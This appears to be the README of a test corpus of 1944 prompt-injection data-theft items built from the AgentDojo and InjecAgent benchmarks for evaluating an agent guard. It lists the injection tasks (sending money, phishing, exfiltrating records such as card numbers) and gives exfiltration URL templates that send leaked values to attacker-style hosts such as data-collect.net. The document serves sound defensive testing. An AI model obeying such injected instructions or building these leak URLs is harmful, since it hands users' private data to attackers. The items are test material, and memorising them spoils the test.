# Corpus 3: attacks adapted from AgentDojo and InjecAgent

1944 items, all `label: "attack"`, `signal: "visible"`, built by `node build.mjs` (deterministic, two runs give the same sha256). No item was written by hand: every leaked value and every user prompt comes from the sources; the script only maps them onto Ressac gestures. `stats.json` holds the counts below as the script printed them.

## Sources

| Source | Commit | Licence | Used |
|---|---|---|---|
| AgentDojo, github.com/ethz-spylab/agentdojo | 089ed468cf3ed0322acc66b0211f26d9d90dbf60 | MIT (Debenedetti, Zhang, Balunovic, Beurer-Kellner, Fischer, Tramèr, 2024) | `runs/*/<suite>/<user task>/important_instructions/<injection task>.json` |
| InjecAgent, github.com/uiuc-kang-lab/InjecAgent | f19c9f2c79a41046eb13c03c51a24c567a8ffa07 | MIT (Qiusi Zhan, 2023) | `data/test_cases_ds_base.json`, `data/attacker_simulated_responses.json` |

Both are shallow clones under `src/`. Nothing was sent to any service besides the two clones.

## Counts

Each kept source case gives 3 items: `<dataset>-query` (`search_web`), `<dataset>-address` (composed address, value percent-encoded), and the same address with the value in base64 (`variant: "encoded"`, same category).

| | cases kept | query | address | address, encoded |
|---|---|---|---|---|
| AgentDojo | 172 | 172 | 172 | 172 |
| InjecAgent | 476 | 476 | 476 | 476 |
| Total | 648 | 648 | 648 | 648 |

The address tool turns with the case: 432 `open_tab`, 432 `navigate`, 432 `read_pages` (plain and encoded items of a case share the tool). 90 distinct user prompts (`goalId` 3001 to 3090).

AgentDojo cases kept per injection task: banking 0: 16, 1: 16, 2: 16, 3: 16, 8: 13; slack 2: 21, 4: 21; travel 3: 8, 5: 7; workspace 3: 22, 4: 8, 5: 6, 8: 1, 9: 1.
InjecAgent: 28 data tools × 17 user cases.

## Dropped

AgentDojo, out of 949 pairs (user task × injection task, all versions present in the recorded runs):
- 367 pairs, action-only injection tasks: banking 4, 5, 6, 7 (change a recurring payment, send money, change the password); slack 1, 3, 5 (send or visit a phishing link, invite a user); travel 0, 2, 4, 6 (book a hotel, create an event, recommend a hotel); workspace 0, 1, 2, 13 (send a fixed text, delete a file, create an event, phishing mails).
- 377 pairs with no recorded run where the benchmark's own check says the attack succeeded (workspace 6, 7, 10, 11, 12 lose all 40 pairs each this way; workspace 8 and 9 keep one each).
- 20 pairs, travel 1 (« send all messages »): the attack succeeded in some runs, but the mail body is the conversation or public listings, never data read from the user's side.
- 13 pairs where the attack is marked succeeded but no call to the attacker carries a usable value (no such call, or an empty body).
- Not counted as pairs: the other attack templates of the runs (`direct`, `ignore_previous`, `tool_knowledge`, …) were not used; only `important_instructions`, the benchmark's reference attack.

InjecAgent:
- 510 direct-harm cases (`test_cases_dh_*`): action-only, not read.
- 544 enhanced data-stealing cases (`test_cases_ds_enhanced.json`): same pairs as the base file with a stronger injection sentence; the leak is identical, so they would be duplicates.
- 68 base cases (4 data tools × 17): the tool returns a file path or a status, no data to read (`DeepfakeGeneratorGenerateAudioDeepfake`, `EpicFHIRDownloadFiles`, `SpokeoDownloadPublicRecord`, `The23andMeDownloadData`).

## Mapping choices

Common:
- The leaked value is put on one line and cut at 400 characters (14 AgentDojo and about 100 InjecAgent cases are cut). The three items of a case carry the same value.
- Sources with only an e-mail or IBAN sink get the neutral host `https://data-collect.net/in?to=<the source's sink>&data=<value>`. AgentDojo slack keeps the source's endpoint: `https://www.my-website-234.com/random?content=<value>`.
- `typed` and `goal` are the source's user prompt, verbatim (English).
- `source` follows the brief. AgentDojo items add `trace`: the recorded run adapted (it names the user task and the model).

AgentDojo:
- A pair is adapted from its first successful recorded run, `gpt-4o-2024-05-13` first, then the other 28 run folders in name order (132 of 172 cases come from gpt-4o).
- `past` is the run's own tool results before the leak call, in order: user-side reads become `read_tab` on a fitting address (bank: fictional `www.mybank-online.com`; Slack, Gmail, Calendar, Drive, Contacts, Booking profile), public reads (`get_webpage`, travel listings) become `read_pages` with `searchTab: true`. Writes (send_money, send_email, reserve_hotel…) and `get_current_day` have no Ressac gesture and are left out. Results are cut at 12 000 characters (21 results).
- The leak is the first call to the attacker (send_money to its IBAN: the subject; send_email to its mailbox: the body; post_webpage to its site: the content) of which at least half the identifying words (5+ characters, or holding a digit) appear in the user-side reads before it.
- No search was added before the reads: the user tasks (pay a bill, read a channel) do not imply one, and the recorded reads already make the session.

InjecAgent:
- The source has no recorded run. The private data is the repository's simulated response of the attacker's first tool (first entry of that tool in file order), turned to plain text (JSON or Python structure characters dropped, values untouched). It becomes a `read_tab` on the matching private page, or `search_history` for the two history tools. Addresses are in the `PRIVATE` table of build.mjs; the bank and the investment account are fictional hosts.
- The user's task becomes: `search_web` → `navigate` (followed result) → `read_tab` with `searchTab: true` for the 9 public user tools, or `list_tabs` → `read_tab` of the user's own tab for the 8 private ones (Gmail, Calendar, Evernote, Todoist, Twilio, Shopify admin). That read holds the source's tool response with the injected instruction. The 9 search queries and the page titles are the only hand-written strings (`USER` table), all honest gestures.
- The leak is the whole data (cut at 400), since the source's attacker asks for all of it.

## Doubts

- Low-sensitivity leaks: AgentDojo banking 0, 2, 3 leak values such as « Spotify Premium », « Sushi », « Pizza party », « iPhone 3GS ». As a `search_web` query these 48 items look like an honest search; a miss there says little. They are the source's values, so they stay; filter on `source` to set them aside.
- The value is what the recorded model sent, not always what the attacker asked: banking 1 sometimes leaks the user's own IBAN instead of the dinner companion's. One gemini run carries a literal `\n` in the value.
- AgentDojo counts depend on which models happened to fall for the attack; 4 cases come from a run with a defence switched on (spotlighting), whose tool results carry its delimiters.
- InjecAgent has only 28 distinct leaks, each repeated in 17 user contexts: the 1428 items are not 1428 independent attacks. Report rates per data tool as well.
- InjecAgent query items put a whole record in a search query (« card_number: 4543 …, cvv: 342 »); a real injected agent might send less. Card numbers there are the source's and mostly fail the Luhn check; nothing was fixed.
- Some InjecAgent data is not strictly the user's own (`SpokeoSearchPeople`, `GitHubGetUserDetails`, `TwilioGetPhoneNumberInfo` look up a third party); kept because the source files them under data stealing.
- The private read is shown as an already open tab (`list_tabs` then `read_tab`); the injected agent's own `open_tab` to reach it is not in `past`.
- `searchTab: true` on the public reads follows my reading of the schema (the search's own cookieless page); the private data read never has it.
- `data-collect.net` and the fictional bank hosts were not checked for existence; nothing contacts them.
- `goalId` starts at 3001 to stay clear of other corpora; I did not open them to check.
- Base64 is the only encoded variant; hex, splitting across parameters and path placement are not covered because the sources do not do them.
